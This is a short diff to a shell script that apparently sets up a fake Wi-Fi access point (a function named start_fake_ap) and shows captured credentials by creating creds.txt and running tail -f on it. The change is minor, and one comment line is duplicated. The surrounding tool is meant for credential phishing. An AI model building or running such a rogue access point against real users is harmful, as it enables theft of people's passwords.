@@ -141,10 +141,16 @@ start_fake_ap() {
 }
 
 # Function to continuously display captured credentials
+# Function to continuously display captured credentials
 display_creds() {
+    # Create creds.txt if it doesn't exist
+    touch creds.txt
+
     echo "Waiting for credentials..."
+    # Use tail -f on creds.txt
     tail -f creds.txt
 }
+
 
 # Main script starts here
 
